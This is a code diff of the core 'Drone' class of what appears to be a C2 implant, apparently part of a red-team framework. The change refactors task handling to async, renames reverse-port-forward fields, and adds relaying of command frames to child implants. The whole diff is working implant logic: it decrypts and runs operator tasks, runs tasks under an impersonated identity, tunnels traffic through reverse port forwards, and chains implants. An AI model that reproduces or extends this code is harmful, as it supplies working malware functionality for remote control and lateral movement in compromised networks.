@@ -27,10 +27,10 @@ public sealed class Drone
     private readonly List<DroneCommand> _commands = new();
     private readonly Dictionary<string, CancellationTokenSource> _taskTokens = new();
     
-    private readonly List<ReversePortForwardState> _rportfwdStates = new();
-    private readonly Dictionary<string, ConcurrentQueue<byte[]>> _rportfwdQueue = new();
+    private readonly List<ReversePortForwardState> _revPortForwardStates = new();
+    private readonly Dictionary<string, ConcurrentQueue<byte[]>> _revPortForwardQueues = new();
 
-    private readonly ConcurrentQueue<C2Frame> _outbound = new();
+    private readonly List<ICommModule> _children = new();
 
     public async Task Run()
     {
@@ -51,11 +51,8 @@ public sealed class Drone
             var inbound = await _commModule.ReadFrames();
             
             // process them
-            HandleInboundFrames(inbound);
-            
-            // flush outbound queue
-            await FlushOutboundQueue();
-            
+            await HandleInboundFrames(inbound);
+
             // sleep
             var interval = Config.Get<int>(Setting.SLEEP_INTERVAL);
             var jitter = Config.Get<int>(Setting.SLEEP_JITTER);
@@ -74,26 +71,32 @@ public sealed class Drone
         _token.Dispose();
     }
 
-    private void HandleInboundFrames(IEnumerable<C2Frame> frames)
+    private async Task HandleInboundFrames(IEnumerable<C2Frame> frames)
     {
         foreach (var frame in frames)
-            HandleFrame(frame);
+        {
+            // if not for this drone, send to children
+            if (!frame.DroneId.Equals(_metadata.Id))
+            {
+                _children.ForEach(c => c.SendFrame(frame));
+                continue;
+            }
+            
+            await HandleFrame(frame);
+        }
     }
 
-    private void HandleFrame(C2Frame frame)
+    private async Task HandleFrame(C2Frame frame)
     {
-        switch (frame.FrameType)
+        switch (frame.Type)
         {
-            case FrameType.NOP:
-                break;
-            
-            case FrameType.CHECKIN:
+            case FrameType.CHECK_IN:
                 break;
 
             case FrameType.TASK:
             {
-                var task = Crypto.Decrypt<DroneTask>(frame.Value);
-                HandleTask(task);
+                var task = Crypto.Decrypt<DroneTask>(frame.Data);
+                await HandleTask(task);
                 
                 break;
             }
@@ -106,15 +109,15 @@ public sealed class Drone
 
             case FrameType.TASK_CANCEL:
             {
-                var taskId = Crypto.Decrypt<string>(frame.Value);
+                var taskId = Crypto.Decrypt<string>(frame.Data);
                 CancelTask(taskId);
                 
                 break;
             }
 
-            case FrameType.RPORTFWD:
+            case FrameType.REV_PORT_FWD:
             {
-                var packet = Crypto.Decrypt<ReversePortForwardPacket>(frame.Value);
+                var packet = Crypto.Decrypt<ReversePortForwardPacket>(frame.Data);
                 HandleReversePortForwardPacket(packet);
                 
                 break;
@@ -125,7 +128,7 @@ public sealed class Drone
         }
     }
 
-    private void HandleTask(DroneTask task)
+    private async Task HandleTask(DroneTask task)
     {
         // get the command
         var command = _commands.FirstOrDefault(c => c.Command == task.Command);
@@ -133,26 +136,26 @@ public sealed class Drone
         if (command is null)
         {
             var e = new ArgumentOutOfRangeException(nameof(command));
-            SendTaskError(task.Id, e.Message);
+            await SendTaskError(task.Id, e.Message);
             
             return;
         }
         
         // execute
         if (command.Threaded) ExecuteTaskThreaded(command, task);
-        else ExecuteTask(command, task);
+        else await ExecuteTask(command, task);
     }
 
-    private void ExecuteTask(IDroneCommand command, DroneTask task)
+    private async Task ExecuteTask(IDroneCommand command, DroneTask task)
     {
         try
         {
             // execute without a token
-            command.Execute(task, CancellationToken.None);
+            await command.Execute(task, CancellationToken.None);
         }
         catch (Exception e)
         {
-            SendTaskError(task.Id, e.Message);
+            await SendTaskError(task.Id, e.Message);
         }
     }
 
@@ -172,22 +175,22 @@ public sealed class Drone
         // create impersonation context
         using var context = identity.Impersonate();
         
-        var thread = new Thread(() =>
+        var thread = new Thread(async () =>
         {
             // wrap this in a try/catch
             try
             {
                 // this blocks inside the thread
-                command.Execute(task, tokenSource.Token);
+                await command.Execute(task, tokenSource.Token);
             }
             catch (TaskCanceledException)
             {
                 // send a task complete
-                SendTaskComplete(task.Id);
+                await SendTaskComplete(task.Id);
             }
             catch (Exception e)
             {
-                SendTaskError(task.Id, e.Message);
+                await SendTaskError(task.Id, e.Message);
             }
             finally
             {
@@ -219,7 +222,7 @@ public sealed class Drone
             case ReversePortForwardPacket.PacketType.START:
             {
                 // create new queue
-                _rportfwdQueue.Add(packet.Id, new ConcurrentQueue<byte[]>());
+                _revPortForwardQueues.Add(packet.Id, new ConcurrentQueue<byte[]>());
                 
                 // start the forward
                 HandleNewReversePortForward(packet);
@@ -229,22 +232,22 @@ public sealed class Drone
             case ReversePortForwardPacket.PacketType.DATA:
             {
                 // queue the data
-                if (_rportfwdQueue.ContainsKey(packet.Id))
-                    _rportfwdQueue[packet.Id].Enqueue(packet.Data);
+                if (_revPortForwardQueues.ContainsKey(packet.Id))
+                    _revPortForwardQueues[packet.Id].Enqueue(packet.Data);
                 
                 break;
             }
 
             case ReversePortForwardPacket.PacketType.STOP:
             {
-                var state = _rportfwdStates.Find(s => s.Id.Equals(packet.Id));
+                var state = _revPortForwardStates.Find(s => s.Id.Equals(packet.Id));
                 if (state is null)
                     return;
                 
                 state.Dispose();
 
-                _rportfwdStates.Remove(state);
-                _rportfwdQueue.Remove(packet.Id);
+                _revPortForwardStates.Remove(state);
+                _revPortForwardQueues.Remove(packet.Id);
 
                 break;
             }
@@ -264,8 +267,8 @@ public sealed class Drone
         var state = new ReversePortForwardState(packet.Id, listener);
         listener.BeginAcceptSocket(ClientCallback, state);
         
-        if (!_rportfwdStates.Any(s => s.Id.Equals(packet.Id)))
-            _rportfwdStates.Add(state);
+        if (!_revPortForwardStates.Any(s => s.Id.Equals(packet.Id)))
+            _revPortForwardStates.Add(state);
     }
 
     private void ClientCallback(IAsyncResult ar)
@@ -293,7 +296,7 @@ public sealed class Drone
         }
     }
 
-    private void ReceiveCallback(IAsyncResult ar)
+    private async void ReceiveCallback(IAsyncResult ar)
     {
         if (ar.AsyncState is not ReversePortForwardState state)
             return;
@@ -325,11 +328,11 @@ public sealed class Drone
                 Data = state.GetStreamData()
             };
 
-            SendC2Frame(new C2Frame(FrameType.RPORTFWD, Crypto.Encrypt(packet)));
+            await SendC2Frame(new C2Frame(_metadata.Id, FrameType.REV_PORT_FWD, Crypto.Encrypt(packet)));
             
             // wait for response
             byte[] outbound;
-            while (!_rportfwdQueue[state.Id].TryDequeue(out outbound))
+            while (!_revPortForwardQueues[state.Id].TryDequeue(out outbound))
                 Thread.Sleep(10);
             
             // send response
@@ -343,49 +346,36 @@ public sealed class Drone
         }
     }
 
-    public void SendTaskRunning(string taskId)
+    public async Task SendTaskRunning(string taskId)
     {
-        SendTaskOutput(new TaskOutput(taskId, TaskStatus.RUNNING));
+        await SendTaskOutput(new TaskOutput(taskId, TaskStatus.RUNNING));
     }
 
-    public void SendTaskOutput(string taskId, string output)
+    public async Task SendTaskOutput(string taskId, string output)
     {
-        SendTaskOutput(new TaskOutput(taskId, output));
+        await SendTaskOutput(new TaskOutput(taskId, output));
     }
 
-    public void SendTaskComplete(string taskId)
+    public async Task SendTaskComplete(string taskId)
     {
-        SendTaskOutput(new TaskOutput(taskId, TaskStatus.COMPLETE));
+        await SendTaskOutput(new TaskOutput(taskId, TaskStatus.COMPLETE));
     }
     
-    public void SendTaskError(string taskId, string error)
+    public async Task SendTaskError(string taskId, string error)
     {
         var taskOutput = new TaskOutput(taskId, TaskStatus.ABORTED, error);
-        SendTaskOutput(taskOutput);
+        await SendTaskOutput(taskOutput);
     }
 
-    public void SendTaskOutput(TaskOutput output)
+    public async Task SendTaskOutput(TaskOutput output)
     {
-        var frame = new C2Frame(FrameType.TASK_OUTPUT, Crypto.Encrypt(output));
-        SendC2Frame(frame);
+        var frame = new C2Frame(_metadata.Id, FrameType.TASK_OUTPUT, Crypto.Encrypt(output));
+        await SendC2Frame(frame);
     }
 
-    public void SendC2Frame(C2Frame frame)
+    public async Task SendC2Frame(C2Frame frame)
     {
-        _outbound.Enqueue(frame);
-    }
-
-    private async Task FlushOutboundQueue()
-    {
-        if (_outbound.IsEmpty)
-            return;
-        
-        List<C2Frame> frames = new();
-
-        while (_outbound.TryDequeue(out var frame))
-            frames.Add(frame);
-
-        await _commModule.SendFrames(frames.ToArray());
+        await _commModule.SendFrame(frame);
     }
 
     private void LoadCommands()
@@ -418,10 +408,10 @@ public sealed class Drone
         }
     }
 
-    public void Stop()
+    public async Task Stop()
     {
-        // send an exit frame with metadata
-        _outbound.Enqueue(new C2Frame(FrameType.EXIT, Crypto.Encrypt(_metadata)));
+        // send an exit frame
+        await SendC2Frame(new C2Frame(_metadata.Id, FrameType.EXIT));
 
         // cancel main token
         _token.Cancel();
